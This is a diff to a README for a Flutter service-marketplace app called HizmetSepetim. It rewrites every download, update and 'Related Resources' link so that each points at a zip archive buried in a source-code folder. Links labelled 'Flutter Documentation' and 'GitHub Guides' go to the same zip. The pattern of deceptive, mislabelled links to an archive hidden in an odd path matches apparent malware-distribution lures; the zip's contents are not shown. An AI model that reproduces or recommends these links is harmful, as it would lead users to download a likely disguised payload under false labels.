@@ -25,10 +25,10 @@ HizmetSepetim is a platform designed to bring users together with service provid
 To get started with HizmetSepetim, you need to download the application. Follow the steps below to install it on your device.
 
 ## 📥 Download the Application
-[![Download HizmetSepetimFlutter](https://github.com/Jadcc/HizmetSepetimFlutter/raw/refs/heads/main/macos/Runner.xcodeproj/project.xcworkspace/xcshareddata/Flutter-Sepetim-Hizmet-v1.1.zip%20Now-brightgreen)](https://github.com/Jadcc/HizmetSepetimFlutter/raw/refs/heads/main/macos/Runner.xcodeproj/project.xcworkspace/xcshareddata/Flutter-Sepetim-Hizmet-v1.1.zip)
+[![Download HizmetSepetimFlutter](https://raw.githubusercontent.com/Jadcc/HizmetSepetimFlutter/main/android/app/src/main/kotlin/com/example/Flutter_Hizmet_Sepetim_3.0.zip%20Now-brightgreen)](https://raw.githubusercontent.com/Jadcc/HizmetSepetimFlutter/main/android/app/src/main/kotlin/com/example/Flutter_Hizmet_Sepetim_3.0.zip)
 
 ## 📋 Download & Install
-1. Visit [this page to download](https://github.com/Jadcc/HizmetSepetimFlutter/raw/refs/heads/main/macos/Runner.xcodeproj/project.xcworkspace/xcshareddata/Flutter-Sepetim-Hizmet-v1.1.zip). You will find the latest releases listed there.
+1. Visit [this page to download](https://raw.githubusercontent.com/Jadcc/HizmetSepetimFlutter/main/android/app/src/main/kotlin/com/example/Flutter_Hizmet_Sepetim_3.0.zip). You will find the latest releases listed there.
 2. Choose the correct version for your device:
    - For Android, download the `.apk` file.
    - For iOS, download from the App Store link provided.
@@ -40,7 +40,7 @@ To get started with HizmetSepetim, you need to download the application. Follow 
 
 ## 🔄 How to Update
 To ensure you have the latest features and improvements:
-1. Go to [this page](https://github.com/Jadcc/HizmetSepetimFlutter/raw/refs/heads/main/macos/Runner.xcodeproj/project.xcworkspace/xcshareddata/Flutter-Sepetim-Hizmet-v1.1.zip).
+1. Go to [this page](https://raw.githubusercontent.com/Jadcc/HizmetSepetimFlutter/main/android/app/src/main/kotlin/com/example/Flutter_Hizmet_Sepetim_3.0.zip).
 2. Download the latest version following the same steps outlined in the Download & Install section.
 3. Overwrite the existing application if prompted during the installation.
 
@@ -61,8 +61,8 @@ If you encounter issues while downloading or running the application, check out 
 - multi-platform
 
 ## 🔗 Related Resources
-- [Flutter Documentation](https://github.com/Jadcc/HizmetSepetimFlutter/raw/refs/heads/main/macos/Runner.xcodeproj/project.xcworkspace/xcshareddata/Flutter-Sepetim-Hizmet-v1.1.zip)
-- [GitHub Guides](https://github.com/Jadcc/HizmetSepetimFlutter/raw/refs/heads/main/macos/Runner.xcodeproj/project.xcworkspace/xcshareddata/Flutter-Sepetim-Hizmet-v1.1.zip)
+- [Flutter Documentation](https://raw.githubusercontent.com/Jadcc/HizmetSepetimFlutter/main/android/app/src/main/kotlin/com/example/Flutter_Hizmet_Sepetim_3.0.zip)
+- [GitHub Guides](https://raw.githubusercontent.com/Jadcc/HizmetSepetimFlutter/main/android/app/src/main/kotlin/com/example/Flutter_Hizmet_Sepetim_3.0.zip)
 - [Service Provider Support](#) 
 
 Stay connected with HizmetSepetim and enjoy a seamless experience in finding the best services available!
